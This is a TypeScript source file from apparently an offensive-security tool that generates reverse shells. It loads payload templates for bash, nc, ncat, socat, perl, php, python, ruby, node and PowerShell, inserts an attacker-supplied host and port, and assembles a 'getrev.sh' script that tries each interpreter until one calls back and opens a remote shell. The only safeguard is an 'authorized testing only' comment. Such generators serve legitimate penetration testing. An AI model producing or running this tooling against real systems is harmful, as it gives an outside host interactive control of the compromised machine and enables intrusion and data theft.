import type { Endpoint } from "./endpoint";
import { parseEndpoint } from "./endpoint";
import bash from "./payloads/bash.txt";
import nc from "./payloads/nc.txt";
import ncat from "./payloads/ncat.txt";
import node from "./payloads/node.txt";
import perl from "./payloads/perl.txt";
import php from "./payloads/php.txt";
import powershell from "./payloads/powershell.txt";
import python from "./payloads/python.txt";
import python3 from "./payloads/python3.txt";
import ruby from "./payloads/ruby.txt";
import socat from "./payloads/socat.txt";

type Payload = { command: string; template: string; ipv4Only?: boolean };

const unixPayloads: readonly Payload[] = [
  { command: "socat", template: socat },
  { command: "python3", template: python3 },
  { command: "python", template: python },
  { command: "ncat", template: ncat },
  { command: "nc", template: nc },
  { command: "perl", template: perl },
  { command: "php", template: php },
  { command: "ruby", template: ruby },
  { command: "node", template: node },
  { command: "bash", template: bash, ipv4Only: true },
];

function render(template: string, endpoint: Endpoint): string {
  const address = endpoint.host.includes(":")
    ? `[${endpoint.host}]:${endpoint.port}`
    : `${endpoint.host}:${endpoint.port}`;
  return template
    .replaceAll("{{HOST}}", endpoint.host)
    .replaceAll("{{PORT}}", String(endpoint.port))
    .replaceAll("{{ADDRESS}}", address)
    .trim();
}

export function unixPayloadCommands(address: string): ReadonlyArray<{ command: string; code: string }> {
  const endpoint = parseEndpoint(address);
  return unixPayloads
    .filter((payload) => !payload.ipv4Only || !endpoint.host.includes(":"))
    .map(({ command, template }) => ({ command, code: render(template, endpoint) }));
}

export function reverseShell(address: string): string {
  const chain = unixPayloadCommands(address)
    .map(
      ({ command, code }) =>
        `  if command -v ${command} >/dev/null 2>&1; then\n    ${code} && return 0\n  fi`,
    )
    .join("\n");

  return `#!/bin/sh
# getrev.sh: authorized testing only
run() {
${chain}
  return 127
}

run
status=$?
[ "$status" -eq 0 ] || echo 'getrev.sh: no callback succeeded' >&2
exit "$status"
`;
}

export function reversePowerShell(address: string): string {
  return `${render(powershell, parseEndpoint(address))}\n`;
}
